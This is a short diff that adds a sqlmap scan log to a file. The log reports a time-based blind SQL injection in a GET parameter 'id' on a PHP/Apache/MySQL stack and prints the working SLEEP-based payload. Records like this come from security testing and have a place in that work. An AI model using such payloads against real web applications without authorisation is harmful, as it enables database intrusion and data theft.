@@ -1,0 +1,9 @@
+sqlmap identified the following injection point(s) with a total of 100 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: id=70506 AND (SELECT * FROM (SELECT(SLEEP(5)))VJnc)
+---
+web application technology: PHP 5.3.3, Apache
+back-end DBMS: MySQL 5.0.12
